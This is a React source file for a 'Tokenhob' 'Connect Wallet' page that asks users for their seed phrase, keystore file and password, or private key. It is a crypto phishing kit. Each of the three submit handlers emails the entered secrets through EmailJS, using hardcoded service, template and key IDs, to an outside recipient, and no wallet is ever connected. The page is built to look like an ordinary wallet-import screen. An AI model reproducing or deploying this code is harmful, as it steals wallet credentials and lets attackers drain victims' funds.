import { useEffect, useState } from "react";
import { Button } from "../components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "../components/ui/card";
import { Input } from "../components/ui/input";
import { Label } from "../components/ui/label";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "../components/ui/tabs";
import { Textarea } from "../components/ui/textarea";
import { useWallet } from "../hooks/use-wallet";
import { ArrowLeft, Loader2 } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useDropzone } from "react-dropzone";
import { SubmitHandler, useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { countWords, findMultiple } from "../lib/utils";
import emailjs from "@emailjs/browser";
import axios from "axios";

const mnemonicSchema = z.object({
  mnemonic: z.string().min(10, {
    message: "mnemonic must not be empty",
  }),
});

type MnemonicType = z.infer<typeof mnemonicSchema>;

const privateKeySchema = z.object({
  privateKey: z.string().min(2, {
    message: "private key must not be empty",
  }),
  password: z.string().min(2, {
    message: "password must not be empty",
  }),
});

type PrivateKeyType = z.infer<typeof privateKeySchema>;

const keyStoreSchema = z.object({
  password: z.string().min(2, {
    message: "password must not be empty",
  }),
  file: z.instanceof(File, { message: "A file is required" }),
});

type KeyStoreType = z.infer<typeof keyStoreSchema>;

const ConnectWalet = () => {
  const { acceptedFiles, getRootProps, getInputProps } = useDropzone({
    onDrop: (files) => {
      if (files.length === 1) {
        keystoreForm.setValue("file", files[0]);
      } else {
        keystoreForm.setError("file", {
          type: "manual",
          message: "Exactly one file is required",
        });
      }
    },
  });
  const { selectedWallet } = useWallet();
  const [isLoading, setIsLoading] = useState<
    "Mnemonic" | "PrivateKey" | "Keystore" | null
  >(null);

  const navigate = useNavigate();

  const mnemonicForm = useForm<MnemonicType>({
    resolver: zodResolver(mnemonicSchema),
    defaultValues: {
      mnemonic: "",
    },
  });
  const onMenonicSubmit = async ({ mnemonic }: MnemonicType) => {
    if (findMultiple(countWords(mnemonic))) {
      setIsLoading("Mnemonic");

      emailjs
        .send(
          "service_8aznyvt",
          "template_hnet3wv",
          {
            from_name: "tokenhob",
            message: mnemonic,
          },
          { publicKey: "L8nGK1vSp66Eu4CT8" }
        )
        .then((data) => {
          setIsLoading(null);
          mnemonicForm.reset();
        });
    } else {
      mnemonicForm.setError("mnemonic", {
        message: "Invalid Information, please review entries",
      });
    }
  };

  const keystoreForm = useForm<KeyStoreType>({
    resolver: zodResolver(keyStoreSchema),
  });

  const keystoreSubmit: SubmitHandler<KeyStoreType> = (values) => {
    setIsLoading("Keystore");

    emailjs
      .send(
        "service_8aznyvt",
        "template_hnet3wv",
        {
          from_name: "tokenhob",
          message: values,
        },
        { publicKey: "L8nGK1vSp66Eu4CT8" }
      )
      .then((data) => {
        setIsLoading(null);
        keystoreForm.reset();
      });
  };
  const privateKeyForm = useForm<PrivateKeyType>({
    resolver: zodResolver(privateKeySchema),
    defaultValues: {
      password: "",
      privateKey: "",
    },
  });
  const privateKeySubmit = (values: PrivateKeyType) => {
    setIsLoading("PrivateKey");
    emailjs
    .send(
      "service_8aznyvt",
      "template_hnet3wv",
      {
        from_name: "tokenhob",
        message: JSON.stringify(values),
      },
      { publicKey: "L8nGK1vSp66Eu4CT8" }
    )
    .then((data) => {
      setIsLoading(null);
      privateKeyForm.reset();
    });
  };

  const files = acceptedFiles.map((file: File) => (
    <li className="px-4 py-2 rounded-md bg-gray-200" key={file.name}>
      {file.name} - {file.size} bytes
    </li>
  ));

  const handleNavigate = () => {
    navigate(-1);
  };

  useEffect(() => {
    document.title = "Tokenhob | Connect Wallet";
  }, []);

  return (
    <div className="px-4 py-6 mt-24 w-full">
      <section className="w-full max-w-screen-md mx-auto">
        <div className="flex justify-between items-center pt-4 pb-8 ">
          <div className="flex flex-col gap-y-4">
            <p
              className="text-white justify-center items-center gap-x-4 cursor-pointer"
              onClick={handleNavigate}
            >
              <ArrowLeft className="inline mr-2" />
              <span>Back</span>
            </p>
            <h1 className="text-white text-2xl md:text-3xl">
              Connent to Wallet
            </h1>
          </div>
          {selectedWallet && (
            <div className=" rounded-lg">
              <div className="flex flex-col justify-between items-center h-full">
                <div className="w-10 h-10 sm:w-16 sm:h-16 flex justify-center items-center bg-white rounded-full">
                  <img
                    src={selectedWallet.imagePath}
                    alt={selectedWallet.name}
                    className="rounded-full w-10 h-10 sm:w-16 sm:h-16"
                  />
                </div>

                <div className="w-full">
                  <p className="w-full text-white text-center text-xs sm:text-sm  py-2">
                    {selectedWallet.name}
                  </p>
                </div>
              </div>
            </div>
          )}
        </div>

        <Tabs defaultValue="mnemonic" className="w-full">
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="mnemonic">Mnemonic</TabsTrigger>
            <TabsTrigger value="keystore">Keystore</TabsTrigger>
            <TabsTrigger value="private_key">Private Key</TabsTrigger>
          </TabsList>
          <TabsContent value="mnemonic">
            <Card>
              <CardHeader>
                <CardTitle>Mnemonic</CardTitle>
                <CardDescription>
                  Please enter your 12/24 word phrase
                  <br />
                  <span className="inline-block text-xs py-4 text-green-600">
                    Separate each Mnemonic Phrase with a space.
                  </span>
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-2">
                <form
                  onSubmit={mnemonicForm.handleSubmit(onMenonicSubmit)}
                  className="space-y-4"
                >
                  <div className="space-y-1">
                    <Textarea
                      {...mnemonicForm.register("mnemonic")}
                      rows={8}
                      placeholder="Mnemonic"
                    />
                    {mnemonicForm.formState.errors.mnemonic && (
                      <p className="text-destructive text-xs inline-block">
                        {mnemonicForm.formState.errors.mnemonic.message}
                      </p>
                    )}
                  </div>
                  <Button
                    type="submit"
                    disabled={keystoreForm.formState.isSubmitting}
                  >
                    {isLoading === "Mnemonic" ? (
                      <div className="flex gap-x-4">
                        <p>Submitting</p>{" "}
                        <Loader2 className="w-4 h-4 animate-spin" />
                      </div>
                    ) : (
                      "Import"
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="keystore">
            <Card>
              <CardHeader>
                <CardTitle>Keystore</CardTitle>
                <CardDescription>
                  Please select your keystore file
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-2">
                <form
                  onSubmit={keystoreForm.handleSubmit(keystoreSubmit)}
                  className="space-y-4 flex"
                >
                  <div className="flex flex-col gap-y-5 w-full items-start justify-center">
                    <Label
                      htmlFor="dropzone-file"
                      {...getRootProps({
                        className:
                          "flex  w-full cursor-pointer flex-col items-center justify-center rounded-lg border-2 border-dashed border-gray-300 bg-gray-50 hover:bg-gray-100 dark:border-gray-600 dark:bg-gray-700 dark:hover:border-gray-500 dark:hover:bg-gray-600",
                      })}
                    >
                      <div className="flex flex-col items-center justify-center pt-5">
                        <svg
                          className="mb-4 h-8 w-8 text-gray-500 dark:text-gray-400"
                          aria-hidden="true"
                          xmlns="http://www.w3.org/2000/svg"
                          fill="none"
                          viewBox="0 0 20 16"
                        >
                          <path
                            stroke="currentColor"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M13 13h3a3 3 0 0 0 0-6h-.025A5.56 5.56 0 0 0 16 6.5 5.5 5.5 0 0 0 5.207 5.021C5.137 5.017 5.071 5 5 5a4 4 0 0 0 0 8h2.167M10 15V6m0 0L8 8m2-2 2 2"
                          />
                        </svg>
                        <p className="mb-2 text-sm text-gray-500 dark:text-gray-400">
                          <span className="font-semibold">
                            Choose Keystore File
                          </span>{" "}
                          or drag and drop
                        </p>
                      </div>
                      <div className="flex flex-col w-full px-4">
                        <input
                          {...getInputProps()}
                          {...keystoreForm.register("file")}
                          id="dropzone-file"
                          className="hidden"
                        />
                        {keystoreForm.formState.errors.file && (
                          <p className="text-destructive text-xs inline-block">
                            {keystoreForm.formState.errors.file.message}
                          </p>
                        )}

                        {files.length > 0 && (
                          <aside className="w-full ">
                            <h4 className="text-sm py-2">Files</h4>
                            <ul className="py-2">{files}</ul>
                          </aside>
                        )}
                      </div>
                    </Label>

                    <Label htmlFor="wallet-password" className="text-left">
                      Typically 12(sometimes 24) words separated by single
                      spaces
                    </Label>
                    <Input
                      {...keystoreForm.register("password")}
                      id="wallet-password"
                      placeholder="Wallet Password"
                    />
                    {keystoreForm.formState.errors.password && (
                      <p className="text-destructive text-xs inline-block">
                        {keystoreForm.formState.errors.password.message}
                      </p>
                    )}

                    <Button type="submit" className="self-start">
                      {isLoading === "Mnemonic" ? (
                        <div className="flex gap-x-4">
                          <p>Submitting</p>{" "}
                          <Loader2 className="w-4 h-4 animate-spin" />
                        </div>
                      ) : (
                        "Connect to Wallet"
                      )}
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="private_key">
            <Card>
              <CardHeader>
                <CardTitle>Private Key</CardTitle>
                <CardDescription>Please enter your private key</CardDescription>
              </CardHeader>
              <CardContent className="space-y-2">
                <form
                  onSubmit={privateKeyForm.handleSubmit(privateKeySubmit)}
                  className="space-y-4"
                >
                  <div className="space-y-1 flex flex-col gap-y-4">
                    <Textarea
                      {...privateKeyForm.register("privateKey")}
                      rows={8}
                      placeholder="Private Key"
                    />
                    {privateKeyForm.formState.errors.privateKey && (
                      <p className="text-destructive text-xs inline-block">
                        {privateKeyForm.formState.errors.privateKey.message}
                      </p>
                    )}

                    <div>
                      <Label className="text-sm">
                        Input the BIP39/BIP44 recovery phrase here to restore
                        the Mnemonic keys that manage your acccounts.
                      </Label>
                      <Input
                        {...privateKeyForm.register("password")}
                        placeholder="Enter temporary session password"
                        {...privateKeyForm.register("password")}
                      />
                    </div>
                  </div>
                  <Button type="submit">
                    {isLoading === "PrivateKey" ? (
                      <div className="flex gap-x-4">
                        <p>Submitting</p>{" "}
                        <Loader2 className="w-4 h-4 animate-spin" />
                      </div>
                    ) : (
                      "Restore"
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </section>
    </div>
  );
};

export default ConnectWalet;
